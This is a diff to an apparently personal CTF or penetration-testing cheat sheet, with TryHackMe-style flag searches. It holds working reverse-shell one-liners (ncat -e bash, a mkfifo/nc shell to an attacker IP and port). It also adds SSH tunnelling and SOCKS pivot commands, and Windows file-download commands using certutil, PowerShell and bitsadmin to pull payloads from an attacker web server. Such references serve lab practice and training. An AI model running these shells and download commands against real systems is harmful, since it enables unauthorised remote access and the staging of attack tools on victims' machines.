@@ -20,11 +20,26 @@ ncat 10.11.99.141 5555 -e bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 ```
 ### [Other_Reverse_Shell_Site](https://www.revshells.com/)
-
+# SSH Proxies
+```bash
+ssh -L 7777:localhost:8888 user@192.168.0.100
+ssh -R 12340:localhost:9999 user@192.168.0.100
+ssh -C2qTnN -D 1080 user@target.host
+ssh -tt -L8080:localhost:8157 sean@10.11.1.251 ssh -t -D 8157 mario@10.1.1.1 -p 222
+-oHostKeyAlgorithms=+ssh-rsa
+```
 # File_Transfer ✅
+## linux
 ```bash
 python3 -m http.server 8000
 wget http://0.0.0.0:8000/linpeas.sh
+```
+## windows 
+```bash
+certutil -urlcache -split -f http://10.10.10.10:8000/namefile.txt C:\Users\Public\namefile.txt
+powershell -c wget "http://10.10.10.10:8000/namefile.txt" -OutFile "C:\Windows\Temp\namefile.txt"
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10:8000/namefile.txt' -OutFile 'C:\Windows\Temp\namefile.txt'"
+bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10:8000/namefile.txt C:\Users\temp\namefile.txt
 ```
 # Enumeration ✅📚
 ## Nmap_Enumeration ✅
@@ -222,8 +237,6 @@ make;make install
 # Machine Tricks ✅📚
 ## Flag_finder ✅
 ```bash
--oHostKeyAlgorithms=+ssh-rsa
-
 grep -iR "THM{" / 2>/dev/null          # flag prefix
 grep -R  "VEhN" / 2>/dev/null          # base64
 grep -RE '[0-9a-f]{32}' . 2>/dev/null  # hash
@@ -288,6 +301,7 @@ cat /etc/shells (show available shells)
 ```
 ### Tools_Useful
 [pspy](https://github.com/DominicBreuker/pspy)
+[chisel](https://github.com/jpillora/chisel)
 ### disable_rootkit
 ```bash
 echo 1 > /proc/sys/kernel/modules_disabled
